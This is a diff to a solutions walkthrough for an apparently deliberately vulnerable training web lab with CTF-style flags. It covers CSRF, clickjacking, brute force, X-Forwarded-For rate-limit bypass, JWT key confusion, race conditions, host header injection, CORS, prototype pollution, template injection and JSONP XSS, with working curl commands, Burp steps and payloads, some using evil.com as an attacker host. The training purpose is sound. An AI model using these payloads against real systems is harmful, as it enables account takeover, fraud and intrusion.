+**2. Scope Leak (Data Exposure, Not RCE)** – `PENTRIX{...}`
+Once template syntax evaluates, probe what else lives in the template's scope. The greeting handler's closure also holds a server-side variable containing this challenge's flag, and the naive engine lets your expression read it directly:
 ```
 GET /ssti/greet?name={{secretFlag}}
 ```
-Why it works: templates are code. Rendering user input as template source hands attackers the interpreter.
+Why it works: the expression runs with the handler's closure scope visible, so a variable the developer only meant for server-side use is readable by anyone who can inject an expression. This is a scope leak (data exposure), not code execution: no OS command runs.
 
 **Burp workflow:** Same route, /ssti/greet with the name parameter. In Repeater, first confirm {{ }} evaluates with a harmless arithmetic expression, then pivot to probing which server-side variables the template scope can see. Try the most obvious conventional name for the flag variable inside {{ }} and watch the greeting echo its value. One Repeater send per guess is plenty, no Intruder run needed here.
 
@@ -1480,32 +1517,29 @@ Log in (`GET /csrf/login/alice`), then note the email change needs no token and 
 ```
 GET /csrf/change-email?email=pwned@evil.com
 ```
-In the real attack this URL sits in an `<img>` tag on the attacker's page; your browser sends the request *with your cookies* when you visit it.
+In the real attack this URL sits in an `<img>` tag on the attacker's page; your browser sends the request *with your cookies* when you visit it. The flag demands proof the request really crossed sites: it only fires when the request carries a foreign `Referer` or `Origin` header (a host different from the lab's). Replaying the URL in your own session, with no header or a same-origin one, still changes the email but earns no flag.
 
-**Burp workflow:** Open /csrf/login/alice in your browser through the Proxy so the session cookie is logged, then send GET /csrf/change-email?email=attacker@evil.com to Repeater (Ctrl+R) and hit Send. The email flips with no token, proving the request rides purely on your cookies. To think like the attacker, picture that same GET URL sitting in an <img> tag: any logged-in victim who loads it gets their email changed silently.
+**Burp workflow:** Open /csrf/login/alice in your browser through the Proxy so the session cookie is logged, then send GET /csrf/change-email?email=attacker@evil.com to Repeater (Ctrl+R). Before you hit Send, add a foreign header, for example `Referer: https://evil.com/` (or an `Origin` on a foreign host): with that cross-site evidence the email flips *and* the flag fires. Send it once without the header to see the difference: the email still changes, but no flag is awarded. Burp can also build the attacker page for you: right-click the working request and choose Engagement tools, Generate CSRF PoC.
 
 
 **2. Clickjacking** – `PENTRIX{...}`
 ```
 GET /csrf/framedemo
 ```
-The page is frameable because no `X-Frame-Options` / `frame-ancestors` header is set, so an attacker can overlay invisible frames and steal clicks.
-Why it works: without framing defenses, your authenticated page becomes a puppet inside the attacker's page.
+The demo page embeds the account actions page (`/csrf/vip-action`) in an iframe, and that page sends no `X-Frame-Options` / `frame-ancestors` header, so any site can frame it. Visiting the demo alone awards nothing. The demo issues a one-time frame token and loads the victim page inside the frame with it (`/csrf/vip-action?frame=<token>`); click the framed "Delete my account" button (a real attack hides the frame under a decoy button) and the framed form posts the token back, which is when the flag is awarded.
+Why it works: without framing defenses, your authenticated page becomes a puppet inside the attacker's page, and the framed submit proves a click really landed on the hidden button.
 
-**Burp workflow:** Open GET /csrf/framedemo with the Proxy on and read the response headers in the bottom panel. You will find no X-Frame-Options and no Content-Security-Policy frame-ancestors, which is exactly the missing defense that lets an attacker frame the page. To feel the attack, save a tiny HTML page with an <iframe> pointing at the demo and watch it load unchallenged.
-
-
----
+**Burp workflow:** Open GET /csrf/framedemo with the Proxy on and find the frame request to `/csrf/vip-action?frame=...` in Proxy history; read its response headers in the bottom panel: no X-Frame-Options and no Content-Security-Policy frame-ancestors, which is exactly the missing defense. Send that framed GET to Repeater (Ctrl+R) and replay it with the token so the server records a real framed load in your session, then replay the framed form's POST to `/csrf/vip-action` with the same `frame` token and your session cookie: the load plus the post-back reads as a framed click and awards the flag. Clicking the framed button in the browser performs the same chain.
 
 
 **3. JSON API CSRF via text/plain (simple request)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
-2. Open `/csrf/json-email` and submit the "Fire forged JSON request" form (it uses `enctype="text/plain"` with a hidden field named `{"email":"attacker@evil.com"}`).
-   Equivalent curl: `curl -b cookies -X POST -H "Content-Type: text/plain" -d '{"email":"attacker@evil.com"}' /csrf/api/email`
-3. The email changes and the flag is awarded.
+2. Open `/csrf/json-email` and look at the "Fire forged JSON request" form (it uses `enctype="text/plain"` with a hidden field named `{"email":"attacker@evil.com"}`). Submitting it from this page earns nothing: it is a same-origin request, and the endpoint refuses text/plain forgeries that carry no cross-site evidence (403, nothing changed).
+3. Replay the same request in Burp Repeater with a foreign `Referer` or `Origin` header added: now the email changes and the flag is awarded.
+   Equivalent curl: `curl -b cookies -X POST -H "Content-Type: text/plain" -H "Referer: https://evil.com/" -d '{"email":"attacker@evil.com"}' http://<your-lab-address>/csrf/api/email`
 Why it works: the endpoint mines text/plain bodies for a JSON object and has no CSRF token; a `text/plain` form is a CORS simple request, so no preflight blocks the forged cross-site call and cookies are attached.
 
-**Burp workflow:** Log in at /csrf/login/alice, submit the forged form on /csrf/json-email, and intercept POST /csrf/api/email in the Proxy. Send it to Repeater (Ctrl+R) and note the Content-Type: text/plain header with the JSON-shaped body in a form field named {"email":"attacker@evil.com"}. Change the email value and resend: it works with no token and no preflight, because text/plain counts as a CORS simple request that browsers happily send cross-site with cookies.
+**Burp workflow:** Log in at /csrf/login/alice, submit the forged form on /csrf/json-email, and intercept POST /csrf/api/email in the Proxy. Send it to Repeater (Ctrl+R) and note the Content-Type: text/plain header with the JSON-shaped body in a form field named {"email":"attacker@evil.com"}. Add a foreign `Referer` or `Origin` header (for example `Referer: https://evil.com/`), change the email value, and resend: it works with no token and no preflight, because text/plain counts as a CORS simple request that browsers happily send cross-site with cookies, and the foreign header is the cross-site evidence the flag requires. Resend once without the header to see the 403 refusal.
 
 
 **4. Weak Referer Check Bypass** – `PENTRIX{...}`
@@ -1520,12 +1554,13 @@ Why it works: the check is `referer.includes('pentrix.lab')`, and the attacker f
 
 **5. HTTP Method Override Smuggling (_method=DELETE)** – `PENTRIX{...}`
 1. Log in: open `/csrf/login/alice`.
-2. Open `/csrf/account` and submit the form containing the hidden `_method=DELETE` field (a plain POST).
-   Equivalent curl: `curl -b cookies -X POST -d "_method=DELETE" /csrf/account`
-3. The delete path triggers and the flag is awarded. (A real `DELETE /csrf/account` also deletes but earns no flag.)
+2. Open `/csrf/account` and look at the form containing the hidden `_method=DELETE` field (a plain POST). Submitting it from this page earns nothing: it is a same-origin request, and the endpoint refuses overrides that carry no cross-site evidence (403, account untouched).
+3. Replay the same POST in Burp Repeater with a foreign `Referer` or `Origin` header added: the delete path triggers and the flag is awarded.
+   Equivalent curl: `curl -b cookies -X POST -H "Referer: https://evil.com/" -d "_method=DELETE" http://<your-lab-address>/csrf/account`
+   (A real `DELETE /csrf/account` also deletes but earns no flag.)
 Why it works: cross-site `DELETE` needs a CORS preflight, but a plain POST does not; the app's manual `_method` override lets the "protected" method ride in on a preflight-free POST.
 
-**Burp workflow:** Log in as alice, submit the delete form on /csrf/account, and intercept POST /csrf/account with the _method=DELETE field in the Proxy. Send it to Repeater (Ctrl+R), tweak the field to _method=DELETE again on demand, and watch the delete path trigger while the request stays a plain POST. Compare by sending a real DELETE /csrf/account in Repeater: it also deletes but earns no flag, which proves the challenge is about the preflight-free POST smuggling the dangerous method.
+**Burp workflow:** Log in as alice, submit the delete form on /csrf/account, and intercept POST /csrf/account with the _method=DELETE field in the Proxy. Send it to Repeater (Ctrl+R), keep the field at _method=DELETE, add a foreign `Referer` or `Origin` header, and watch the delete path trigger while the request stays a plain POST. Without the foreign header the same request is refused with 403. Compare by sending a real DELETE /csrf/account in Repeater: it also deletes but earns no flag, which proves the challenge is about the preflight-free POST smuggling the dangerous method.
 
 
 ## api – API Security
@@ -1581,14 +1616,15 @@ projections instead of `SELECT *`.
    username is never enforced, so nothing stops you:
    ```bash
    for i in $(seq 1 14); do
-     curl -s -X POST http://<your-lab-address>/api/login \
+     curl -s -c jar -b jar -X POST http://<your-lab-address>/api/login \
        -H 'Content-Type: application/json' \
        -d '{"username":"alice","password":"wrong"}' > /dev/null
    done
    ```
-2. Log in correctly on attempt 15:
+   (Attempts are counted per session, so every call must share one cookie jar, as above.)
+2. Log in correctly on attempt 15, in the same session:
    ```bash
-   curl -s -X POST http://<your-lab-address>/api/login \
+   curl -s -b jar -X POST http://<your-lab-address>/api/login \
      -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"alice123"}'
    ```
@@ -1605,10 +1641,11 @@ Real logins need throttling, lockout, or CAPTCHA after a few failures.
 **4. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{...}`
 
 1. Burn your quota: `POST /api/v1/login` locks an "IP" out after 3 bad
-   attempts.
+   attempts. The counters are per session, so keep one cookie jar (`jar`)
+   for every call in this challenge.
    ```bash
    for i in 1 2 3 4; do
-     curl -s -X POST http://<your-lab-address>/api/v1/login \
+     curl -s -c jar -b jar -X POST http://<your-lab-address>/api/v1/login \
        -H 'Content-Type: application/json' \
        -d '{"username":"alice","password":"wrong"}'
    done
@@ -1617,14 +1654,14 @@ Real logins need throttling, lockout, or CAPTCHA after a few failures.
 2. Confirm the lockout bites real logins too: the correct password from your
    real IP also gets 429.
    ```bash
-   curl -s -X POST http://<your-lab-address>/api/v1/login \
+   curl -s -c jar -b jar -X POST http://<your-lab-address>/api/v1/login \
      -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"alice123"}'   # still 429
    ```
 3. Change your "IP" and walk in. The rate-limit identity comes from the
    `X-Forwarded-For` header, which you control:
    ```bash
-   curl -s -X POST http://<your-lab-address>/api/v1/login \
+   curl -s -c jar -b jar -X POST http://<your-lab-address>/api/v1/login \
      -H 'Content-Type: application/json' \
      -H 'X-Forwarded-For: 10.9.9.9' \
      -d '{"username":"alice","password":"alice123"}'
@@ -1663,7 +1700,7 @@ made it over, so any logged-in user can read anyone's record through the new
 version. Every new version or copy of an endpoint must carry the original
 access checks; review versioned routes for exactly this drift.
 
-**Burp workflow:** Log in as alice, then send GET /api/v1/users/3 to Repeater (Ctrl+R) and confirm the 403 telling you to view only your own record. Copy the request, change the path to /api/v2/users/3, and resend: the copied v2 route skips the authorization check and returns the full user record. Module: api – API Security. Challenges covered: 5.
+**Burp workflow:** Log in as alice, then send GET /api/v1/users/3 to Repeater (Ctrl+R) and confirm the 403 telling you to view only your own record. Copy the request, change the path to /api/v2/users/3, and resend: the copied v2 route skips the authorization check and returns the full user record.
 
 
 ---
@@ -1699,9 +1736,6 @@ Directory browsing is enabled. The listing reveals `secret.txt`; fetch it for th
 
 
 ---
-
-*All flags look like `PENTRIX{...}`. If a payload stops working, reset the lab (delete the local app data and restart); some challenges mutate lab state (passwords, roles, emails) by design.*
-
 
 **4. Exposed .git Directory** - `PENTRIX{...}`
 Walk the chain:
@@ -1760,6 +1794,8 @@ Read back: `GET /misconfig/files/pwn.txt` prints the uploaded bytes and the flag
 Why it works: the endpoint accepts arbitrary file writes with no authentication, and the written file is served back raw, proving the write.
 
 **Burp workflow:** In Repeater, build a request with the method line `PUT /misconfig/files/<yourname>.txt HTTP/1.1`, add the header `Content-Type: text/plain`, and put a short text body in the message body. Send it and expect `201 Created`, proving the unauthenticated write. Then change the method back to `GET` on the same path and resend to read your uploaded bytes back. If a write fails, double check your Host header and Content-Length before blaming the server.
+
+*Note for the whole lab: all flags look like `PENTRIX{...}`. If a payload stops working, reset the lab (delete the local app data and restart); some challenges mutate lab state (passwords, roles, emails) by design.*
 
 ---
 
@@ -1863,7 +1899,7 @@ const crypto = require('crypto');
 const jwt = require('jsonwebtoken');
 (async () => {
   const html = await (await fetch('http://<your-lab-address>/jwt/confusion-pubkey')).text();
-  const pem = html.match(/<pre>([\s\S]*?)<\/pre>/)[1];
+  const pem = html.match(/<pre class="payload-body">([\s\S]*?)<\/pre>/)[1];
   console.log(jwt.sign({user:'guest',role:'admin'},
     crypto.createSecretKey(Buffer.from(pem)), {algorithm:'HS256'}));
 })();"
@@ -1915,7 +1951,7 @@ Submit it at `/jwt/kiddefault`.
 Why it works: the missing-kid fallback uses a predictable hardcoded secret, so
 anyone who guesses it can mint valid tokens without a `kid` at all.
 
-**Burp workflow:** Open GET /jwt/kiddefault and submit the form once to capture the POST /jwt/kiddefault request in Proxy, then send it to Repeater (Ctrl+R). Sign an admin token with the hardcoded fallback secret and no `kid` header in your forged token, and replace the `token` field with it. Resend: the server falls back to the default key for the kid-less token and accepts it. Module: jwt – JWT Attacks. Challenges covered: 8.
+**Burp workflow:** Open GET /jwt/kiddefault and submit the form once to capture the POST /jwt/kiddefault request in Proxy, then send it to Repeater (Ctrl+R). Sign an admin token with the hardcoded fallback secret and no `kid` header in your forged token, and replace the `token` field with it. Resend: the server falls back to the default key for the kid-less token and accepts it.
 
 ---
 
@@ -2038,19 +2074,21 @@ curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<sid-from-log>\n') \
 Why it works: verbose debug logging writes live session ids to a readable log,
 handing the admin's session to anyone who looks.
 
-**Burp workflow:** Open /session/logleak through Burp Proxy, follow the link to the debug log viewer at /session/debug-log, and find the line "admin session started sid=...". Send the admin panel request GET /session/leak-admin to Repeater (Ctrl+R), set the lab_sid cookie to the sid you copied from the log, and re-send to open the admin panel with the leaked session. Module: session (Session Management). Challenges covered: 6.
+**Burp workflow:** Open /session/logleak through Burp Proxy, follow the link to the debug log viewer at /session/debug-log, and find the line "admin session started sid=...". Send the admin panel request GET /session/leak-admin to Repeater (Ctrl+R), set the lab_sid cookie to the sid you copied from the log, and re-send to open the admin panel with the leaked session.
 
 ---
 
 
 ## race – Race Conditions
 
+All race state is kept per session, so every request in a challenge must share one session: the curl sequences below keep one cookie jar (`-c jar -b jar` on the reset, `-b jar` afterwards), and the Burp runs reuse the one captured session cookie. Firing the same commands without the jar gives every request a fresh session and the race can never land.
+
 **1. Single-Use Coupon Redeemed Twice** – `PENTRIX{...}`
 The coupon page redeems coupon RACE10 ($10 credit, one use). One click redeems it
 once; twenty at the same instant redeem it many times:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 20 | xargs -P20 -I{} curl -s -X POST http://<your-lab-address>/race/coupon/redeem
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 20 | xargs -P20 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/coupon/redeem
 ```
 Reload `/race/coupon`: the one-use coupon shows several redemptions and the
 credit is a multiple of $10. One of the responses contains the flag.
@@ -2064,8 +2102,8 @@ lands (time-of-check to time-of-use).
 **2. Double-Spend the Balance** – `PENTRIX{...}`
 The wallet holds $100. Fire 20 parallel transfers of the full $100:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 20 | xargs -P20 -I{} curl -s -X POST http://<your-lab-address>/race/transfer -d 'to=attacker&amount=100'
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 20 | xargs -P20 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/transfer -d 'to=attacker&amount=100'
 ```
 Reload `/race/transfer`: the balance is deep negative (e.g. -$1900) and the
 ledger lists all 20 transfers. One of the responses contains the flag.
@@ -2080,8 +2118,8 @@ never had.
 The poll allows one vote per name. Two votes for the same name, sent in
 parallel, both get recorded:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 2 | xargs -P2 -I{} curl -s -X POST http://<your-lab-address>/race/vote -d 'name=voter1'
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 2 | xargs -P2 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/vote -d 'name=voter1'
 ```
 Reload `/race/vote`: `voter1` has 2 votes. (Voting twice sequentially is correctly
 rejected with "Already voted"; only the parallel pair races.)
@@ -2095,8 +2133,8 @@ async pause, so both requests pass the check before either insert happens.
 Referral code REF2026 pays 50 points, claimable once. Claim it 10 times in
 parallel:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 10 | xargs -P10 -I{} curl -s -X POST http://<your-lab-address>/race/referral -d 'code=REF2026'
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 10 | xargs -P10 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/referral -d 'code=REF2026'
 ```
 Reload `/race/referral`: claims and points are multiples of the single bonus.
 Why it works: the "already claimed?" check races the claim write across the
@@ -2108,8 +2146,8 @@ async gap, so concurrent claims each see an unclaimed code.
 **5. Duplicate Username Registration** – `PENTRIX{...}`
 Usernames must be unique. Register the same name twice in parallel:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 2 | xargs -P2 -I{} curl -s -X POST http://<your-lab-address>/race/register -d 'username=racer&password=hunter2'
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 2 | xargs -P2 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/register -d 'username=racer&password=hunter2'
 ```
 Reload `/race/register`: two accounts named `racer` exist. (A sequential second
 registration is correctly rejected with "Username taken".)
@@ -2123,8 +2161,8 @@ pause, so both registrations pass the check before either row is inserted.
 Uploads are served immediately but a simulated AV scan deletes each file 2
 seconds later. Upload, then fetch within the window:
 ```
-curl -s -X POST http://<your-lab-address>/race/upload -d 'filename=secret.txt&content=top+secret+lab+data'
-curl -s http://<your-lab-address>/race/files/secret.txt
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/upload -d 'filename=secret.txt&content=top+secret+lab+data'
+curl -s -b jar http://<your-lab-address>/race/files/secret.txt
 ```
 The second request returns the file content and the flag. Wait 3 seconds and
 fetch again: `404: file not found`, the scan deleted it.
@@ -2139,8 +2177,8 @@ only runs later, a classic time-of-check to time-of-use gap between "stored" and
 The API allows 5 requests per window. The counter increments only after an async
 gap, so a parallel burst all reads the old counter:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 20 | xargs -P20 -I{} curl -s -X POST http://<your-lab-address>/race/ratelimit/hit
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 20 | xargs -P20 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/ratelimit/hit
 ```
 Reload `/race/ratelimit`: far more than 5 requests were counted as allowed in
 one window. (Clicking sequentially stops at 5 with a 429, as intended.)
@@ -2154,14 +2192,14 @@ stale counter.
 **8. Oversell the Stock** – `PENTRIX{...}`
 Only 5 gadgets in stock. Order 5 twice, in parallel:
 ```
-curl -s -X POST http://<your-lab-address>/race/reset -o /dev/null
-seq 1 2 | xargs -P2 -I{} curl -s -X POST http://<your-lab-address>/race/stock/buy -d 'qty=5'
+curl -s -c jar -b jar -X POST http://<your-lab-address>/race/reset -o /dev/null
+seq 1 2 | xargs -P2 -I{} curl -s -b jar -X POST http://<your-lab-address>/race/stock/buy -d 'qty=5'
 ```
 Reload `/race/stock`: 10 items sold from stock of 5, stock shows -5.
 Why it works: the stock check and the decrement are separated by an async
 pause, so both orders see the pre-sale stock of 5 and both go through.
 
-**Burp workflow:** In Proxy, order 5 gadgets and send POST `/race/stock/buy` with `qty=5` to Intruder (Ctrl+I). Launch just a 2-thread parallel burst of the identical request. Reload `/race/stock`: 10 items sold from a stock of 5, stock shows -5. Reset with POST `/race/reset` before each run so you start from the 5-item stock. Module race: 8 challenges covered.
+**Burp workflow:** In Proxy, order 5 gadgets and send POST `/race/stock/buy` with `qty=5` to Intruder (Ctrl+I). Launch just a 2-thread parallel burst of the identical request. Reload `/race/stock`: 10 items sold from a stock of 5, stock shows -5. Reset with POST `/race/reset` before each run so you start from the 5-item stock.
 
 
 ---
@@ -2290,7 +2328,7 @@ $5000 is refunded on a $50 order; the balance jumps accordingly.
 Why it works: the refund amount is trusted from client input instead of being
 looked up from the order, so any amount can be refunded.
 
-**Burp workflow:** Buy the $50 hoodie on /bizlogic/refund with Proxy on and note the order id from the response or history. Submit the refund form once, send that POST to Repeater (Ctrl+R), and raise the hidden amount field far above what you paid, keeping the same order_id. The server trusts the client-supplied amount instead of looking up the order total, so the refund credits your balance with the inflated figure. Module: bizlogic (Business Logic Flaws), 8 challenges covered.
+**Burp workflow:** Buy the $50 hoodie on /bizlogic/refund with Proxy on and note the order id from the response or history. Submit the refund form once, send that POST to Repeater (Ctrl+R), and raise the hidden amount field far above what you paid, keeping the same order_id. The server trusts the client-supplied amount instead of looking up the order total, so the refund credits your balance with the inflated figure.
 
 ---
 
@@ -2369,7 +2407,7 @@ curl -i "http://<your-lab-address>/redirect/polluted?next=safe&next=https://evil
 Why it works: with duplicate `next` parameters the code silently honors the
 last value; the first one is only camouflage for anyone reviewing the link.
 
-**Burp workflow:** In the Proxy, browse to `/redirect/polluted?next=safe` and send the request to Repeater. Duplicate the `next` parameter in the query string so you have a safe value and an attacker value side by side, then re-send and read the 302 `Location` header to see which one won. Try swapping the order and adding more copies; the lab honors one specific position, and finding it is the exercise. Summary: redirect module (Open Redirect), 5 challenges covered.
+**Burp workflow:** In the Proxy, browse to `/redirect/polluted?next=safe` and send the request to Repeater. Duplicate the `next` parameter in the query string so you have a safe value and an attacker value side by side, then re-send and read the 302 `Location` header to see which one won. Try swapping the order and adding more copies; the lab honors one specific position, and finding it is the exercise.
 
 ---
 
@@ -2457,7 +2495,7 @@ Why it works: the post-login redirect is an absolute URL built from the `Host`
 header, so a poisoned header sends the freshly authenticated victim to the
 attacker's domain.
 
-**Burp workflow:** Log in as alice on `/hostheader/login` (username=alice, password=alice123) and intercept the POST in Proxy. Send it to Repeater (Ctrl+R), change `Host` to `evil.com`, and send: the response is a 302 whose `Location` header is the absolute URL `http://evil.com/hostheader/dashboard`. That Location value is the whole proof, because the victim's browser follows it after a successful login, landing authenticated on the attacker's domain. Module: hostheader (Host Header Injection). Challenges covered: 5 of 5.
+**Burp workflow:** Log in as alice on `/hostheader/login` (username=alice, password=alice123) and intercept the POST in Proxy. Send it to Repeater (Ctrl+R), change `Host` to `evil.com`, and send: the response is a 302 whose `Location` header is the absolute URL `http://evil.com/hostheader/dashboard`. That Location value is the whole proof, because the victim's browser follows it after a successful login, landing authenticated on the attacker's domain.
 
 ---
 
@@ -2553,7 +2591,7 @@ Why it works: the sensitive `X-Admin-Token` response header is listed in
 `Access-Control-Expose-Headers`, so any website the victim visits can read it
 with JavaScript.
 
-**Burp workflow:** Visit /cors/api/token in Burp's browser with an attacker Origin and send the request to Repeater (Ctrl+R), then resend with Origin: https://evil.com. Read the response headers: first confirm Access-Control-Allow-Origin is wide open, then look for Access-Control-Expose-Headers and check whether X-Admin-Token is named in it. If the sensitive header is exposed, a page on another origin can read it with JavaScript, so prove it at /cors/prove?vuln=cors-expose-headers&origin=https://evil.com. Module: cors (CORS Misconfiguration). Challenges covered: 6.
+**Burp workflow:** Visit /cors/api/token in Burp's browser with an attacker Origin and send the request to Repeater (Ctrl+R), then resend with Origin: https://evil.com. Read the response headers: first confirm Access-Control-Allow-Origin is wide open, then look for Access-Control-Expose-Headers and check whether X-Admin-Token is named in it. If the sensitive header is exposed, a page on another origin can read it with JavaScript, so prove it at /cors/prove?vuln=cors-expose-headers&origin=https://evil.com.
 
 ---
 
@@ -2613,7 +2651,7 @@ Why it works: the vulnerable merge runs in the victim's browser, so a `__proto__
 2. `curl -c jar -b jar http://<your-lab-address>/proto/unicode/admin` prints `PENTRIX{...}`.
 Why it works: the blacklist scans the raw text, but `JSON.parse` decodes `\u005f` escapes after the scan, so the forbidden `__proto__` key materializes inside the merge.
 
-**Burp workflow:** The `/proto/unicode/merge` endpoint rejects any raw body containing the literal string `__proto__` (400). On the merge page, intercept the `POST /proto/unicode/merge` request in Proxy and send it to Repeater (Ctrl+R). In Repeater, change `Content-Type` to `text/plain` and send the JSON with the forbidden key smuggled as `\u` escapes (each underscore as `\u005f`), so the blacklist scan passes but `JSON.parse` decodes the escapes after the scan. When Repeater shows "Blacklist passed", open `/proto/unicode/admin` in the Burp browser to claim the flag. Module: proto (Prototype Pollution). Challenge count: 6.
+**Burp workflow:** The `/proto/unicode/merge` endpoint rejects any raw body containing the literal string `__proto__` (400). On the merge page, intercept the `POST /proto/unicode/merge` request in Proxy and send it to Repeater (Ctrl+R). In Repeater, change `Content-Type` to `text/plain` and send the JSON with the forbidden key smuggled as `\u` escapes (each underscore as `\u005f`), so the blacklist scan passes but `JSON.parse` decodes the escapes after the scan. When Repeater shows "Blacklist passed", open `/proto/unicode/admin` in the Burp browser to claim the flag.
 
 ---
 
@@ -2694,7 +2732,7 @@ Why it works: a short repeating XOR key turns known plaintext into known keystre
 3. `POST /crypto/keyjs/solve` with `plaintext=<decrypted note>`. The response contains `PENTRIX{...}`.
 Why it works: a key shipped to the browser is public to every visitor, and with the IV prepended to the ciphertext anyone can decrypt the "client-side encrypted" note offline.
 
-**Burp workflow:** Browse to the Secure Notes vault note page through Burp Proxy, then send the GET /crypto/keyjs/app.js request to Repeater (Ctrl+R) and read the served JavaScript to find the hardcoded AES key. Copy the ciphertext hex from the page, decrypt it offline with the stolen key and the prepended IV, and POST the decrypted note to /crypto/keyjs/solve through Repeater. Module: crypto - Cryptographic Failures. Challenges covered: 8.
+**Burp workflow:** Browse to the Secure Notes vault note page through Burp Proxy, then send the GET /crypto/keyjs/app.js request to Repeater (Ctrl+R) and read the served JavaScript to find the hardcoded AES key. Copy the ciphertext hex from the page, decrypt it offline with the stolen key and the prepended IV, and POST the decrypted note to /crypto/keyjs/solve through Repeater.
 
 ---
 
@@ -2955,7 +2993,7 @@ Why it works: a state-changing action is driven by any cross-origin message
 with no origin verification and no user confirmation, which is CSRF delivered
 through postMessage.
 
-**Burp workflow:** With Intercept on, click "Fire payload" on /postmsg/csrf-action/attacker. The victim handler fires POST /postmsg/csrf-action/delete with no origin check and no confirmation, deletes the PenMail account, then beacons v=csrf-action&d=csrf-action:account-deleted. Send the POST to Repeater (Ctrl+R) and replay it to confirm the deletion works with no origin header and no user token at all. Reset the lab account any time with GET /postmsg/csrf-action/reset, which you can fire straight from Repeater when you want to run the drill again. Module: postmsg (postMessage Flaws). 5 challenges.
+**Burp workflow:** With Intercept on, click "Fire payload" on /postmsg/csrf-action/attacker. The victim handler fires POST /postmsg/csrf-action/delete with no origin check and no confirmation, deletes the PenMail account, then beacons v=csrf-action&d=csrf-action:account-deleted. Send the POST to Repeater (Ctrl+R) and replay it to confirm the deletion works with no origin header and no user token at all. Reset the lab account any time with GET /postmsg/csrf-action/reset, which you can fire straight from Repeater when you want to run the drill again.
 
 
 ---
@@ -2999,19 +3037,15 @@ about what is a template.
    and run arbitrary code.
 2. Save this template:
    ```
-   {{constructor.constructor("fetch('/csti/beacon?v=constructor&d=' + encodeURIComponent('code-executed'))")()}}
+   {{constructor.constructor("fetch('/csti/beacon?v=constructor&d=ctor:'+cstiDjb2(CSTI_NONCE)+'&n='+CSTI_NONCE)")()}}
    ```
 3. When the preview renders, the expression compiles the string with `Function`
-   and runs it; the fetch hits the beacon and awards the flag. Proven against
-   the served engine: the payload fires a fetch to exactly
-   `/csti/beacon?v=constructor&d=code-executed`.
-Why it works: exposing `constructor` in the expression scope hands out `Function`,
-turning template evaluation into arbitrary JavaScript execution in the victim's
-browser.
-
-**Burp workflow:** Proxy through `/csti/constructor`, save the form, and find the POST to `/csti/constructor` with the `tpl` field. Send it to Repeater (Ctrl+R) and set `tpl` to an expression that walks from the exposed `constructor` reference to `Function` and runs a beacon fetch from inside the template. Submit from Repeater, then render the preview in the browser so the client engine actually executes your compiled code, and watch Proxy history for the `/csti/beacon?v=constructor` GET.
-
-
+   and runs it; the fetch hits the beacon and awards the flag. The beacon is
+   strict: `n` must echo the page-bound token (`CSTI_NONCE`, computed at
+   runtime by the page script and never present in the page source), and `d`
+   must be `ctor:` followed by `cstiDjb2(CSTI_NONCE)`, the page's own hash of
+   that token. An arbitrary `d` value (a word like `code-executed`, a cookie, a
+   guess) is rejected, and a bare beacon call with no page load earns nothing.
 **4. CSTI Inside an HTML Attribute** – `PENTRIX{...}`
 
 1. Open `/csti/attr` and save `{{7*7}}` as the badge text. View source: the
@@ -3031,11 +3065,16 @@ client-side engine from evaluating the template.
 1. Open `/csti/stored` and save `{{7*7}}` as a display name. It is stored in the
    database (`csti_profiles`) and rendered on every view.
 2. Reload the member list: every visitor's browser evaluates the stored name
-   as a template, the list shows `49`, and the page beacons `v=stored`.
+   as a template and the list shows `49`. That alone does not award the flag:
+   this challenge is victim-bound, so a beacon fired with your own session
+   token is rejected.
+3. Load `/csti/stored/victim-visit`: a simulated victim views the directory in
+   a fresh victim session, your stored template evaluates there, and the flag
+   is awarded on that page.
 Why it works: stored display names are evaluated as templates on every view, so
 the injection persists and fires for every visitor, not just the attacker.
 
-**Burp workflow:** Proxy through `/csti/stored`, fill in the display name form, and intercept the POST to `/csti/stored/profile` to confirm the `name` field carries your template. Send it to Repeater (Ctrl+R) if you want to test variations without retyping, then reload the member list in the browser. The stored name is evaluated as a template on every view, so the beacon GET to `/csti/beacon?v=stored` fires from the page load itself, which you will see in Proxy history. Try viewing the page in a second session too, since this one fires for every visitor, not just you.
+**Burp workflow:** Proxy through `/csti/stored`, fill in the display name form, and intercept the POST to `/csti/stored/profile` to confirm the `name` field carries your template. Send it to Repeater (Ctrl+R) if you want to test variations without retyping, then reload the member list in the browser. The stored name is evaluated as a template on every view, so the beacon GET to `/csti/beacon?v=stored` fires from the page load itself, which you will see in Proxy history. Then load `/csti/stored/victim-visit` in the browser: the simulated victim's fresh session is what claims the flag, since a beacon carrying your own session token is rejected.
 
 ---
 
@@ -3093,14 +3132,27 @@ served to every later visitor.
 
 **1. Callback XSS** – `PENTRIX{...}`
 
-1. `curl -i "http://<your-lab-address>/jsonp/user?callback=alert(1)//"`
-2. The body is `alert(1)//({"user":"alice","role":"user"});` served as
-   `application/javascript`, and the `X-Flag` header carries the flag.
+1. Probe the breakout: `curl -i "http://<your-lab-address>/jsonp/user?callback=alert(1)//"`
